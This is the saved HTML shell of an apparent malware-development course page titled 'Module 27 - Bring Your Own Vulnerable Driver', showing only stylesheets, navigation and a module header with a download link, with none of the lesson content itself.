f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="27_files/css2.css" rel="stylesheet">
        <link href="27_files/css2_002.css" rel="stylesheet">
        <title>Bring Your Own Vulnerable Driver</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="27_files/app-CuOUn2oZ.css"><link rel="stylesheet" href="27_files/app-CuOUn2oZ.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="27_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="27_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="7a9faf896a9b46a0ab2fba8e8e004a20"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="27_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
    
  </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="27_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 27 - Bring Your Own Vulnerable Driver
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="27_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="27_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="27_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="27_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="27_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/BYOVD" target="_blank">
                    <img src="27_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
